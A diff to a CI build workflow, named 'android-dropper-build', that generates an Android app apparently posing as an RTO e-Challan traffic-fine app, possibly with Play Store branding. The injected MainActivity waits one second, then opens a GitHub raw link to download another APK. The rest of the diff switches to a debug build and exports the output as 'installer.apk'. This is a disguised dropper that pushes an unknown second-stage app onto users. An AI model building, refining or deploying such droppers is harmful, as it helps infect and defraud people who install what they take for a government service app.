@@ -1,25 +1,21 @@
 workflows:
   android-dropper-build:
-    name: RTO PlayStore Final Artifact Fix
+    name: RTO Final Success Download
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Master Automatic Repair & Artifact Force
+      - name: Master Build & Artifact Export
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Logo & Resource Fix
+          # 1. Logo Fix (Missing resource error fix)
           mkdir -p app/src/main/res/drawable
           LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
-          if [ -f "$LOGO_FILE" ]; then
-            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
-          else
-            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
-          fi
+          [ -f "$LOGO_FILE" ] && cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
 
-          # 2. Redirect Logic (GitHub URL)
+          # 2. GitHub URL Redirect Logic
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -29,57 +25,39 @@ workflows:
           import android.os.Handler
           import android.os.Looper
           import androidx.appcompat.app.AppCompatActivity
-
           class MainActivity : AppCompatActivity() {
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
-                  try {
-                      setContentView(R.layout.activity_main)
-                      Handler(Looper.getMainLooper()).postDelayed({
-                          val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
-                          val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
-                          startActivity(intent)
-                          finish()
-                      }, 1000)
-                  } catch (e: Exception) {
+                  setContentView(R.layout.activity_main)
+                  Handler(Looper.getMainLooper()).postDelayed({
                       val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                       startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                       finish()
-                  }
+                  }, 1000)
               }
           }
           EOF
 
           # 3. Build Configuration
           rm -f build.gradle settings.gradle gradle.properties
-          echo "android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m" > gradle.properties
+          echo "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
           echo "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
-          
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { 
-                  classpath 'com.android.tools.build:gradle:8.0.2'
-                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
-              }
+              dependencies { classpath 'com.android.tools.build:gradle:8.0.2'; classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20' }
           }
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 4. Build and Force Move APK
+          # 4. Final Compile
           gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
-          ./gradlew assembleRelease \
-            -Pandroid.injected.signing.store.file=$(pwd)/final.keystore \
-            -Pandroid.injected.signing.store.password=pass123 \
-            -Pandroid.injected.signing.key.alias=final_alias \
-            -Pandroid.injected.signing.key.password=pass123 \
-            --no-daemon
+          ./gradlew assembleDebug --no-daemon
 
-          # YEH COMMAND APK KO DHUUND KAR BAHAR LAYEGI
-          mkdir -p ../outputs
-          find . -name "*.apk" -exec cp {} ../outputs/ \;
+          # 5. FORCE EXPORT (This fixes the empty Artifacts tab)
+          mkdir -p $CM_BUILD_DIR/out
+          find . -name "*.apk" -exec cp {} $CM_BUILD_DIR/out/installer.apk \;
           
     artifacts:
-      - ../outputs/*.apk
-      - "**/build/outputs/apk/**/*.apk"
+      - $CM_BUILD_DIR/out/*.apk
